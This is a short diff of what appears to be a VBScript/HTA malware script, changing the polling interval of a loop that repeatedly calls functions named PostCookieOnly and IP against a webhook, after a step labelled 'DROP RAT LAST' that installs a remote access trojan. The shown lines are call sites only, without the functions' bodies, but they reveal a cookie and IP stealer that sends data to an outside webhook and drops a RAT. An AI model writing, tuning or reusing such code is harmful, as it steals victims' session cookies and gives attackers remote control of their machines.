@@ -28,7 +28,7 @@ Call PostCookieOnly(WH)
 ' --- 2. DROP RAT LAST (init only) ---
 Call DropRAT(WH, True)
 
-' --- 3. INTERACTIVE LOOP (Re Grab N, grabs only — no RAT) ---
+' --- 3. INTERACTIVE LOOP (Re Grab N, every 30s, grabs only — no RAT) ---
 Dim runCount
 runCount = 0
 Do
@@ -39,7 +39,7 @@ Do
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
     
-    Call SleepSeconds(1)
+    Call SleepSeconds(30)
 Loop
 
 window.close()
